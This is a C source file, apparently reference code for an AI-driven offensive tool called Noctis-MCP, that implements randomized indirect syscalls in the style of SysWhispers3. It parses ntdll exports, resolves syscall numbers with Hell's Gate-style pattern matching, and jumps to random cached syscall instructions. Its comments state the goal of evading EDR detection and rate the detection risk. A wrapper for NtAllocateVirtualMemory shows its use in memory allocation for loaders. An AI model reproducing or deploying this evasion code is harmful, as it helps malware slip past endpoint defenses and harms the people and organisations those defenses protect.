// Reference code for Noctis-MCP AI intelligence system
// SysWhispers3 - Randomized Syscall Jumper Implementation
//
// TECHNIQUE: Jumper Randomization for Syscall Evasion
// IMPROVEMENT: Eliminates static call patterns detectable by EDRs
// DETECTION RISK: Low (15-20%) vs Hell's Hall (20-25%)
//
// How it works:
// 1. Resolve System Service Number (SSN) from function name
// 2. Find multiple valid syscall instructions in ntdll.dll
// 3. Cache these addresses in an array
// 4. On each syscall invocation, randomly select a cached address
// 5. Jump to that address instead of direct syscall execution
//
// This creates non-deterministic call stacks that evade behavioral detection

#include "syswhispers3.h"
#include <stdio.h>

// Helper: Generate pseudo-random index
static DWORD _SW3_GetRandomIndex(DWORD dwMax) {
    // Simple randomization using timestamp and PID
    LARGE_INTEGER li;
    QueryPerformanceCounter(&li);
    return (DWORD)((li.QuadPart ^ GetCurrentProcessId()) % dwMax);
}

// Helper: Check if address contains valid syscall instruction (0x0F 0x05)
static BOOL _SW3_IsSyscallInstruction(PVOID pAddress) {
    if (!pAddress) return FALSE;

    __try {
        BYTE* pBytes = (BYTE*)pAddress;
        return (pBytes[0] == 0x0F && pBytes[1] == 0x05);
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        return FALSE;
    }
}

// Helper: Find syscall instruction in function
static PVOID _SW3_FindSyscallInFunction(PVOID pFunctionAddr) {
    if (!pFunctionAddr) return NULL;

    BYTE* pCurrent = (BYTE*)pFunctionAddr;

    // Search up to 32 bytes for syscall instruction
    for (DWORD i = 0; i < 32; i++) {
        if (_SW3_IsSyscallInstruction(pCurrent + i)) {
            return (PVOID)(pCurrent + i);
        }
    }

    return NULL;
}

// Helper: Resolve SSN from function name using Hell's Gate technique
static DWORD _SW3_ResolveSSN(HMODULE hNtdll, LPCSTR pszFunctionName) {
    if (!hNtdll || !pszFunctionName) return 0;

    PVOID pFunctionAddr = GetProcAddress(hNtdll, pszFunctionName);
    if (!pFunctionAddr) return 0;

    BYTE* pBytes = (BYTE*)pFunctionAddr;

    // BEST PRACTICE: Validate memory is readable before pattern matching
    // In production, verify pFunctionAddr is within ntdll module bounds
    MEMORY_BASIC_INFORMATION mbi;
    if (VirtualQuery(pFunctionAddr, &mbi, sizeof(mbi)) == 0) return 0;
    if (mbi.State != MEM_COMMIT || !(mbi.Protect & PAGE_EXECUTE_READ)) return 0;

    // Check for direct syscall pattern: mov r10, rcx; mov eax, SSN
    // Pattern: 4C 8B D1 B8 [SSN] [SSN] 00 00
    // IMPORTANT: Read full WORD for SSN (2 bytes), not DWORD (4 bytes)
    if (pBytes[0] == 0x4C && pBytes[1] == 0x8B && pBytes[2] == 0xD1 && pBytes[3] == 0xB8) {
        // Extract SSN from bytes 4-5 (WORD = 2 bytes)
        WORD wSSN = *(WORD*)(pBytes + 4);
        return (DWORD)wSSN;
    }

    // If hooked, try neighboring functions (Halo's Gate approach)
    // This is a simplified version - production code should be more robust
    return 0;
}

// Initialize SysWhispers3 system
BOOL SW3_Initialize(PSYSCALL_CACHE pCache) {
    if (!pCache) return FALSE;

    ZeroMemory(pCache, sizeof(SYSCALL_CACHE));

    // Get ntdll.dll base address
    pCache->hNtdll = GetModuleHandleA("ntdll.dll");
    if (!pCache->hNtdll) {
        return FALSE;
    }

    // Enumerate ntdll exports to find syscall instructions
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pCache->hNtdll;

    // BEST PRACTICE: Validate DOS header
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;

    // BEST PRACTICE: Validate e_lfanew is within bounds
    SIZE_T szModuleSize = 0;
    MEMORY_BASIC_INFORMATION mbi;
    if (VirtualQuery(pCache->hNtdll, &mbi, sizeof(mbi)) > 0) {
        szModuleSize = mbi.RegionSize;
    }
    if (pDosHeader->e_lfanew > szModuleSize - sizeof(IMAGE_NT_HEADERS)) return FALSE;

    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)pCache->hNtdll + pDosHeader->e_lfanew);
    if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE) return FALSE;

    PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)pCache->hNtdll +
        pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD* pNameArray = (DWORD*)((BYTE*)pCache->hNtdll + pExportDir->AddressOfNames);
    DWORD* pFunctionArray = (DWORD*)((BYTE*)pCache->hNtdll + pExportDir->AddressOfFunctions);
    WORD* pOrdinalArray = (WORD*)((BYTE*)pCache->hNtdll + pExportDir->AddressOfNameOrdinals);

    DWORD dwCacheIndex = 0;

    // Iterate through exports looking for Nt* functions with syscalls
    for (DWORD i = 0; i < pExportDir->NumberOfNames && dwCacheIndex < MAX_SYSCALL_CACHE; i++) {
        LPCSTR pszName = (LPCSTR)((BYTE*)pCache->hNtdll + pNameArray[i]);

        // Only process Nt* functions
        if (pszName[0] != 'N' || pszName[1] != 't') continue;

        // Use ordinal table to map name index to function index
        WORD wOrdinal = pOrdinalArray[i];

        // BEST PRACTICE: Validate ordinal is within bounds
        if (wOrdinal >= pExportDir->NumberOfFunctions) continue;

        PVOID pFunctionAddr = (PVOID)((BYTE*)pCache->hNtdll + pFunctionArray[wOrdinal]);
        PVOID pSyscallAddr = _SW3_FindSyscallInFunction(pFunctionAddr);

        if (pSyscallAddr) {
            // Resolve and cache SSN for completeness
            DWORD dwSSN = _SW3_ResolveSSN(pCache->hNtdll, pszName);

            pCache->stubs[dwCacheIndex].dwSSN = dwSSN;
            pCache->stubs[dwCacheIndex].pSyscallAddr = pSyscallAddr;
            pCache->stubs[dwCacheIndex].bCached = TRUE;
            dwCacheIndex++;
        }
    }

    pCache->dwCacheSize = dwCacheIndex;

    return (pCache->dwCacheSize > 0);
}

// Resolve SSN for a specific function
BOOL SW3_ResolveFunction(PSYSCALL_CACHE pCache, LPCSTR pszFunctionName, DWORD* pdwSSN) {
    if (!pCache || !pszFunctionName || !pdwSSN) return FALSE;
    if (!pCache->hNtdll) return FALSE;

    DWORD dwSSN = _SW3_ResolveSSN(pCache->hNtdll, pszFunctionName);
    if (dwSSN == 0) return FALSE;

    *pdwSSN = dwSSN;
    return TRUE;
}

// Get random syscall address from cache
PVOID SW3_GetRandomSyscallAddr(PSYSCALL_CACHE pCache) {
    if (!pCache || pCache->dwCacheSize == 0) return NULL;

    // Get random index
    DWORD dwIndex = _SW3_GetRandomIndex(pCache->dwCacheSize);

    // Return random syscall address
    return pCache->stubs[dwIndex].pSyscallAddr;
}

// ============================================================================
// Assembly stub declarations (implemented in sw3_stub.asm)
// ============================================================================
// These functions are implemented in external assembly file for x64 platforms
// They provide direct syscall execution with randomized jump points
//
// SW3_Syscall: Executes syscall by jumping to random cached syscall instruction
// SW3_SyscallInline: Fallback that executes syscall instruction directly
// ============================================================================

// Declare assembly functions (external linkage)
#ifdef _WIN64
extern NTSTATUS SW3_Syscall(DWORD dwSSN, PVOID pSyscallAddr, ...);
extern NTSTATUS SW3_SyscallInline(DWORD dwSSN, ...);
#else
#error "SysWhispers3 requires x64 architecture"
#endif

// Wrapper: NtAllocateVirtualMemory
// Example showing how to use SW3_Syscall with the cache
NTSTATUS SW3_NtAllocateVirtualMemory(
    PSYSCALL_CACHE pCache,
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
) {
    if (!pCache || pCache->dwCacheSize == 0) {
        return STATUS_UNSUCCESSFUL;
    }

    // Resolve SSN for NtAllocateVirtualMemory
    DWORD dwSSN = 0;
    if (!SW3_ResolveFunction(pCache, "NtAllocateVirtualMemory", &dwSSN)) {
        return STATUS_NOT_FOUND;
    }

    // Get random syscall address from cache
    PVOID pSyscallAddr = SW3_GetRandomSyscallAddr(pCache);
    if (!pSyscallAddr) {
        return STATUS_UNSUCCESSFUL;
    }

    // Execute syscall with randomized jump
    // Calling convention: SW3_Syscall(SSN, SyscallAddr, arg1, arg2, arg3, arg4, arg5, arg6)
    return SW3_Syscall(
        dwSSN,
        pSyscallAddr,
        ProcessHandle,
        BaseAddress,
        ZeroBits,
        RegionSize,
        AllocationType,
        Protect
    );
}

// Cleanup
VOID SW3_Cleanup(PSYSCALL_CACHE pCache) {
    if (pCache) {
        SecureZeroMemory(pCache, sizeof(SYSCALL_CACHE));
    }
}
